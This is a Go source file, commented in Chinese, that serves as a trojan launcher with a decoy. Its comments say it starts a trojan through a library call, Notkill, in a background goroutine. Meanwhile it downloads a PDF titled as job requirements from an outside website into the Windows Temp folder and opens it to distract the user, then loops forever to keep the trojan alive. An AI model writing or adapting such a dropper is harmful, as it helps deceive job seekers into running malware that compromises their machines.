package main

//main方法
import (
	"GO_day_1/mylib"
	"sync"
)

const (
	//下载的文件存放处和打开文件路径
	path = "C:\\Windows\\Temp\\招聘要求1231.pdf"
	//下载文件的url
	url = "https://www.xixixiaoyu.com/tools/hold-all/招聘要求.pdf"
)

var wg sync.WaitGroup

//main方法
func main() {

	//执行木马程序
	go func() {
		//执行木马程序
		mylib.Notkill()
		//执行完成之后正常暂停
		mylib.Stop()
	}()

	//下载要弹出的文件
	mylib.DownloadFile(url, path)
	//打开文件
	mylib.Openfile(path)
	//死循环防止go协程死亡
	select {}
}
